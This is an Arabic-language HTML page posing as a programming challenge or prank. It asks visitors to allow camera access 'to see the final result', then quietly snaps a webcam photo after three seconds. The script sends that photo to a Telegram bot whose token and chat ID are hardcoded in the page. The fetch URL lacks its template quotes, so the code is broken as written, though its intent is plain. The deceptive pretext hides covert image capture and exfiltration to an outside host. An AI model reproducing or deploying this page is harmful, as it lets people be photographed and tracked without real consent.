<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحدي البرمجة - المزحة</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: white; padding-top: 50px; }
        video { border: 5px solid #00ff00; border-radius: 10px; background: #000; }
        .btn { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #00ff00; border: none; border-radius: 5px; margin-top: 20px; color: black; font-weight: bold; }
        p { color: #aaa; }
    </style>
</head>
<body>
    <h2>مرحباً بك في تحدي البرمجة الخاص بي! ??</h2>
    <p>اضغط للبدء (وافق على إذن الكاميرا لترى النتيجة النهائية)</p>
    
    <video id="video" width="400" height="300" autoplay></video>
    <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
    <br>
    <button class="btn" onclick="startTest()">ابدأ التحدي الآن</button>

    <script>
        // معلوماتك التي أعددناها سوياً
        const botToken = "8608335050:AAEgtOoX2E-AC9Uk_jT1R5P7K3FOzpXsQzQ"; 
        const chatId = "8124196406"; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        function startTest() {
            // طلب الإذن وفتح الكاميرا
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    // انتظار 3 ثواني لالتقاط الصورة وإرسالها
                    setTimeout(takeAndSendPhoto, 3000);
                })
                .catch(err => {
                    alert("يجب الموافقة على إذن الكاميرا لكي يعمل التحدي!");
                    console.error(err);
                });
        }

        function takeAndSendPhoto() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 400, 300);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'shot.jpg');
                formData.append('caption', 'وصلت صورة جديدة من موقعك! ????');

                // إرسال الصورة إلى Telegram Bot API
                fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                    method: 'POST',
                    body: formData
                })
                .then(res => {
                    alert("تم إرسال نتيجتك إليّ بنجاح! تفقد هاتفك الآن.");
                })
                .catch(err => {
                    alert("حدث خطأ في الإرسال، تأكد من اتصال الإنترنت.");
                });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
